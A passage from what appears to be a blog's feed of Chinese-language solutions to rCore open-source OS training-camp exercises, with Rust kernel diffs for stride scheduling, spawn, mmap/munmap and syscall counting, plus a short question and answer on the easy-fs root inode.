self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 @@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex ff5b581..d8c5510 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,10 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::&#123;File, Stdin, Stdout&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec;</span></span>@@ -36,6 +37,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlockInner &#123;</span></span>@@ -71,6 +152,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -94,6 +187,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            self.fd_table.len() - 1</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -135,6 +235,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    ],</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -216,6 +320,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -231,6 +339,65 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        // copy fd table</span><span class="token prefix inserted">+</span><span class="token line">        let mut new_fd_table: Vec&lt;Option&lt;Arc&lt;dyn File + Send + Sync>>> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for fd in parent_inner.fd_table.iter() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(file) = fd &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(Some(file.clone()));</span><span class="token prefix inserted">+</span><span class="token line">            &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(None);</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p><strong>Q:</strong> 在我们的 easy-fs 中，root inode 起着什么作用？如果 root inode 中的内容损坏了，会发生什么？</p><p><strong>A:</strong> root inode 起着根目录的作用，如果 root inode 中的内容（例如文件数据链接 <code>direct</code>、<code>indirect</code> 等）损坏了，可能导致根目录下的文件无法被正常访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter5练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-02T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:00.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h3><p>如果只是想根据特定程序来创建进程，而不需要 <code>fork + exec</code> 组合提供的灵活性（如文件重定位等），那么 <code>spawn</code> 将是一个更简洁且效率更高的选择，本实验要求便是实现它。</p><p>对于 <code>spawn</code> 的实现，确实可以简单地将 <code>fork</code> 和 <code>exec</code> 拼接起来。但需要注意的是，<code>fork</code> 首先拷贝父进程的地址空间，<code>exec</code> 再将该地址空间替换，二者融合后最开始地址空间的拷贝其实是徒劳的。如以下代码所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> memory_set <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_existed_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parent_inner<span class="token punctuation">.</span>memory_set<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// futile code!</span><span class="token punctuation">...</span><span class="token keyword">let</span> <span class="token punctuation">(</span>memory_set<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> entry_point<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_elf</span><span class="token punctuation">(</span>elf_data<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="stride-调度算法"><a href="#stride-调度算法" class="headerlink" title="stride 调度算法"></a>stride 调度算法</h3><p>实现一个简单的步长调度算法，由于算法思路比较简单，这里直接介绍实现方式。</p><p>首先，为了保存进程的“步长”和优先级信息，需要为进程控制块添加两个字段 <code>stride</code> 和 <code>prio</code>（不考虑性能，为了实现的简单，<code>pass</code> 字段省略，而是在每次增加步长时再计算）。</p><p>在进行调度时（<code>TaskManager.fetch()</code>），需要从进程就绪队列中找到 stride 最小的进程进行调度，并为其 stride 加上对应的 pass，pass 的计算方式是用预先设定的大常数 BigStride 除以进程优先级 prio 得到。这里如果为了效率考虑，就绪队列可以采用优先队列的数据结构，而为了实现的简单，这里选择一次遍历的方式寻找最小值。</p><p>最后，在一个时间片后，重新调度当前 stride 最小的进程。这一时间片轮转策略已经事先实现好，不需要做修改，实现代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// os/src/task/mod.rs</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">trap_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token operator">!</span> <span class="token punctuation">&#123;</span><span class="token punctuation">...</span>        <span class="token class-name">Trap</span><span class="token punctuation">::</span><span class="token class-name">Interrupt</span><span class="token punctuation">(</span><span class="token class-name">Interrupt</span><span class="token punctuation">::</span><span class="token class-name">SupervisorTimer</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">set_next_trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">suspend_current_and_run_next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">...</span><span class="token punctuation">&#125;</span></code></pre><p>CPU 每个时钟周期都发起一次时钟中断进入内核，内核的 <code>trap_handler</code> 检测到陷入原因是时钟中断，则调用 <code>suspend_current_and_run_next</code> 将当前进程放入就绪队列中，并重新进行调度。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>从本实验开始，内核必须前向兼容，能够通过前一章的所有测试用例。根据文档提示，可以采用 <code>git cherry-pick</code> 系列命令，将其他分支的 commit 移植到本章分支。使用方法如下：</p><ol><li>合并特定的 commit 到当前分支：<code>git cherry-pick &lt;commit id&gt;</code>。</li><li>若遇到冲突，首先打开冲突文件，如：<code>os/src/syscall/process.rs</code>，编辑文件，解决冲突。</li><li>冲突解决后，标记已解决冲突的文件：<code>git add os/src/syscall/process.rs</code>。重复 2、3 步骤，直至解决完所有的冲突。</li><li>继续 <code>cherry-pick</code> 过程：<code>git cherry-pick --continue</code>。</li></ol><p>这一章由于涉及到任务到进程的转变，框架改动较大，且前面章节修改的代码也不算多，因此我最终还是选择了手动移植。但在后面章节的实验中还是建议使用 cherry-pick.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/config.rs b/os/src/config.rsindex 5761cdd..b836e56 100644<span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -23,3 +23,5 @@ pub const TRAP_CONTEXT_BASE: usize = TRAMPOLINE - PAGE_SIZE;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const CLOCK_FREQ: usize = 12500000;</span><span class="token prefix unchanged"> </span><span class="token line">/// the physical memory end</span><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>\ No newline at end of filediff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span 